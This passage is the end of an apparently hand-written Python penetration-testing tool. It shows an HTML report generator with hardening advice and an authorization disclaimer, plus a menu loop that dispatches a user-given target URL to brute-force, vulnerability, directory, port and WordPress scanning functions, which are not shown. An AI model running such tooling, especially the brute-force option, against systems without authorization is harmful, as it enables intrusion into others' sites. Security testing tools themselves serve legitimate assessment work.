            <p><strong>Scan Duration:</strong> {datetime.now() - start_time}</p>
        </div>
        
        <div class="section">
            <h2>⚠️ Vulnerabilities Found</h2>
    """
    
    if vulnerabilities_found:
        for vuln in vulnerabilities_found:
            html_content += f'<div class="vuln">{vuln}</div>'
    else:
        html_content += '<div class="info">No critical vulnerabilities found</div>'
    
    html_content += """
        </div>
        
        <div class="section">
            <h2>🔍 Recommendations</h2>
            <div class="info">
                <h3>Immediate Actions:</h3>
                <ul>
                    <li>Change all default passwords</li>
                    <li>Update WordPress, plugins, and themes</li>
                    <li>Remove exposed backup files</li>
                    <li>Disable directory listing</li>
                    <li>Implement rate limiting on login pages</li>
                </ul>
            </div>
            <div class="warning">
                <h3>Security Hardening:</h3>
                <ul>
                    <li>Install a Web Application Firewall (WAF)</li>
                    <li>Implement two-factor authentication</li>
                    <li>Regular security audits</li>
                    <li>Monitor logs for suspicious activity</li>
                </ul>
            </div>
        </div>
        
        <div class="section">
            <h2>📝 Disclaimer</h2>
            <p>This report is for authorized security testing purposes only.</p>
            <p>Unauthorized access to computer systems is illegal.</p>
            <p>Always obtain proper authorization before testing.</p>
        </div>
    </div>
</body>
</html>
    """
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Report generated: {filename}")
    print(f"{Fore.GREEN}[+]{Fore.WHITE} Open in browser to view detailed results")

def main():
    """Main function"""
    print_banner()
    
    # Get target
    target = input(f"{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}@{Fore.RED}ROOT{Fore.GREEN}]#{Fore.WHITE} Enter target URL: ").strip()
    
    if not target:
        print(f"{Fore.RED}[!]{Fore.WHITE} No target specified. Exiting.")
        sys.exit(1)
    
    if not target.startswith('http'):
        target = 'http://' + target
    
    # Test connection
    try:
        resp = requests.get(target, timeout=5)
        print(f"{Fore.GREEN}[+]{Fore.WHITE} Target is reachable ({resp.status_code})")
    except:
        print(f"{Fore.RED}[!]{Fore.WHITE} Cannot reach target. Check URL and network.")
        sys.exit(1)
    
    while True:
        choice = display_menu()
        
        if choice == '1':
            full_scan(target)
        elif choice == '2':
            recon_only(target)
        elif choice == '3':
            brute_force_attack(target)
        elif choice == '4':
            vulnerability_scanner(target)
        elif choice == '5':
            directory_discovery(target)
        elif choice == '6':
            port_scan_menu(target)
        elif choice == '7':
            ssl_checker_menu(target)
        elif choice == '8':
            wp_scanner_menu(target)
        elif choice == '9':
            generate_report(target, vulnerabilities_found)
        elif choice == '0':
            print(f"\n{Fore.YELLOW}[!]{Fore.WHITE} Exiting... Stay ethical!")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!]{Fore.WHITE} Invalid choice")
        
        input(f"\n{Fore.CYAN}Press Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!]{Fore.WHITE} Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!]{Fore.WHITE} Error: {e}")
        sys.exit(1)